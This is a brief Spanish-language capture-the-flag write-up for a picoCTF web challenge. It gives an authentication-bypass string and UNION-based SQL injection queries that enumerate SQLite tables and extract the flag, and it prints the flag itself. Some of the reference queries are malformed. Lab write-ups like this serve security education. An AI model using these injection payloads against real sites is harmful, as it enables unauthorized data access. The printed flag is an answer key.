### Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:51587/).
### Solución
### Solución 1 - inyeccion
```
usando admin' or 1=1;
accedemos a la BD

- en el campo de búsqueda, usamos, una a una , las siguientes consultas para encontrar la bandera:

`ciudad' union select 1,2,3; ciudad' union select sqlite_version(),2,3; ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,2,flag from more_table;`
```
### Notas adicionales 

|     |                                                         |
| --- | ------------------------------------------------------- |
|     | picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500} |
### Referencias


select * from offices where ity = 'hola' -> union select 1,sqlite_version(),3;

union select 1,name(),3 FROM sqlite_master WHERE type ='table'--

union select 1,sql(),3 FROM sqlite_master WHERE type ='table'--